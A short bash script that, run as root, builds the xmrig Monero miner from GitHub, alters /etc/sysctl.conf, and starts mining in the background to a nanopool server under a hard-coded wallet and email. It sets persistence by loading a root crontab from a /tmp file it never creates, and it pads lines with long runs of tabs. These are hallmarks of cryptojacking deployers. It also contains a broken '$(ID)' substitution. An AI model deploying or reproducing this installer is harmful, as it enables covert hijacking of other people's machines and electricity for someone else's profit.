#! /bin/bash
if [ "$(whoami)" != "root" ];																																																										 then																																																																																																																																																					
        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
        exit 1
fi
WALLET=4AJBPuKtFMAdYLJcGDU4U4NYAm5s8YgdwgAPajuRnpjjK2mTDdwKihkFyuDfjcnhc7JLDWQT17h2RcTxVskeJu8YCiBSLpY
ID="miner"
MAIL=11cj11@bk.ru
PASSWORD="11cj11@bk.ru"

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
sudo apt-get update && sudo apt-get install -y git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc gcc-7 g++-7 
sleep 2
cd /usr/local/src
git clone https://github.com/oldhuman/miner-xmr.git miner
git clone https://github.com/xmrig/xmrig.git
cd /usr/local/src/xmrig ; mkdir build && cd build
cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 -DWITH_HTTPD=OFF && make
cp xmrig /usr/local/bin
sleep 1																																																																																									
xmrig -B -S --donate-level 1 --cpu-priority 3 -o xmr-us-west1.nanopool.org:14444 -u $WALLET.$ID/$MAIL -p "$PASSWORD" --rig-id="$(ID)" -k
echo -e '\033[0;32m##### Miner started \033[0m'
echo -e '\033[0;32m##### Watch: \033[0m'
echo -e '\033[0;32m##### journalctl -t xmrig \033[0m'

sudo crontab -u root /tmp/reboot_cron

